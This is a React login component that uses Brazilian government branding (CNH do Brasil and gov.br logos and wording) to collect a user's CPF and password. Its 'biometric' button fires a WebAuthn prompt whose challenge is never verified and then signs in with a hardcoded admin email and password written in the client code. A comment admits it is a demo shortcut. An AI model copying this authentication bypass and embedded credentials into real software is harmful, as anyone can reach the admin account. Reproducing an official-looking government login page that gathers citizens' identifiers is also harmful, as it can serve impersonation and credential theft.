import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useUser } from '../contexts/UserContext';
import { ScanFace } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';

export function Login() {
    const navigate = useNavigate();
    const { login } = useUser();

    const [cpf, setCpf] = useState('');
    const [password, setPassword] = useState('');
    const [error, setError] = useState('');

    // Biometria
    const [biometryAvailable, setBiometryAvailable] = useState(false);
    const [isAuthenticating, setIsAuthenticating] = useState(false);

    useEffect(() => {
        // Verifica se é um dispositivo móvel
        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

        if (!isMobile) {
            setBiometryAvailable(false);
            return;
        }

        // Verifica se o dispositivo suporta autenticação biométrica (WebAuthn)
        if (window.PublicKeyCredential) {
            PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable()
                .then(available => {
                    setBiometryAvailable(available);
                    if (available) {
                        // Tenta autenticar automaticamente se estiver disponível
                        handleBiometricAuth();
                    }
                })
                .catch(err => console.error("Erro ao verificar biometria", err));
        }
    }, []);

    const handleBiometricAuth = async () => {
        setIsAuthenticating(true);
        try {
            // Desafio fictício apenas para disparar o prompt nativo
            const challenge = new Uint8Array(32);
            window.crypto.getRandomValues(challenge);

            await navigator.credentials.get({
                publicKey: {
                    challenge,
                    rpId: window.location.hostname,
                    userVerification: "required",
                    timeout: 60000,
                }
            });

            // Se não lançar erro, o usuário passou na biometria do sistema
            // Como agora enviamos para o Supabase, precisamos de uma senha válida se quisermos logar.
            // Biometria real exigiria vinculação prévia. Por enquanto, mantemos para demo mas
            // em produção precisaria bater com o banco.
            const success = await login('admin@chl.com', '123321');
            if (success) navigate('/app/dashboard');
            else setIsAuthenticating(false);

        } catch (err) {
            console.warn("Autenticação biométrica falhou ou cancelada", err);
            setIsAuthenticating(false);
        }
    };

    const handleLogin = async (e: React.FormEvent) => {
        e.preventDefault();
        setError('');

        const success = await login(cpf, password);
        if (success) {
            navigate('/app/dashboard');
        } else {
            setError('Dados inválidos. Verifique CPF/Senha.');
        }
    };

    return (
        <div className="min-h-screen bg-white flex flex-col items-center px-6 relative overflow-hidden font-sans">

            {/* Feedback Biometria */}
            <AnimatePresence>
                {isAuthenticating && (
                    <motion.div
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        exit={{ opacity: 0 }}
                        className="absolute inset-0 z-50 bg-white/90 backdrop-blur-sm flex flex-col items-center justify-center"
                    >
                        <div className="bg-white p-8 rounded-2xl shadow-2xl flex flex-col items-center border border-gray-100">
                            <ScanFace size={64} className="text-blue-600 mb-4 animate-pulse" />
                            <p className="text-gray-600 font-medium">Verificando Identidade...</p>
                        </div>
                    </motion.div>
                )}
            </AnimatePresence>

            {/* Logo Top */}
            <div className="mt-12 mb-8">
                <img
                    src="/logos/cnh-do-brasil-seeklogo.png"
                    alt="CNH do Brasil"
                    className="h-16 object-contain"
                />
            </div>

            <div className="w-full max-w-sm">
                <h2 className="text-[#333] font-medium text-center mb-8 text-[18px] leading-snug">
                    Identifique-se no gov.br com seu<br />número de CPF
                </h2>

                <form onSubmit={handleLogin} className="space-y-6">
                    {error && (
                        <div className="text-red-600 text-sm text-center bg-red-50 p-3 rounded-lg border border-red-100">
                            {error}
                        </div>
                    )}

                    <div className="space-y-2">
                        <label className="block text-sm font-bold text-[#333] ml-1">CPF</label>
                        <input
                            type="text"
                            value={cpf}
                            onChange={(e) => setCpf(e.target.value)}
                            className="w-full bg-[#f8f9fa] border border-[#dce2ee] rounded-lg py-3 px-4 text-gray-700 focus:ring-2 focus:ring-blue-600 focus:border-blue-600 outline-none transition-all placeholder-gray-400"
                            placeholder="Digite seu CPF"
                        />
                    </div>

                    <div className="space-y-2">
                        <label className="block text-sm font-bold text-[#333] ml-1">Senha</label>
                        <input
                            type="password"
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            className="w-full bg-[#f8f9fa] border border-[#dce2ee] rounded-lg py-3 px-4 text-gray-700 focus:ring-2 focus:ring-blue-600 focus:border-blue-600 outline-none transition-all placeholder-gray-400"
                            placeholder="Digite sua senha"
                        />
                    </div>

                    <div className="pt-2">
                        <button
                            type="submit"
                            className="w-full bg-[#1351b4] text-white font-bold py-3.5 rounded-full hover:bg-blue-700 active:scale-[0.98] transition-all shadow-md text-[15px]"
                        >
                            Entrar
                        </button>
                    </div>

                    {biometryAvailable && (
                        <button
                            type="button"
                            onClick={handleBiometricAuth}
                            className="w-full bg-white border border-[#1351b4] text-[#1351b4] font-bold py-3.5 rounded-full hover:bg-blue-50 active:scale-[0.98] transition-all flex items-center justify-center gap-2"
                        >
                            <ScanFace size={20} />
                            Entrar com Biometria
                        </button>
                    )}
                </form>

                <div className="text-center mt-8 space-y-4">
                    <button
                        onClick={() => navigate('/admin')}
                        className="text-[#1351b4] text-sm font-semibold hover:underline block w-full"
                    >
                        Esqueci minha senha
                    </button>
                </div>
            </div>

            {/* Footer Logo */}
            <div className="mt-auto pb-8">
                <img
                    src="/logos/governo-federal-do-brasil-2025-seeklogo.png"
                    alt="gov.br"
                    className="h-9 object-contain opacity-90"
                />
            </div>
        </div>
    );
}
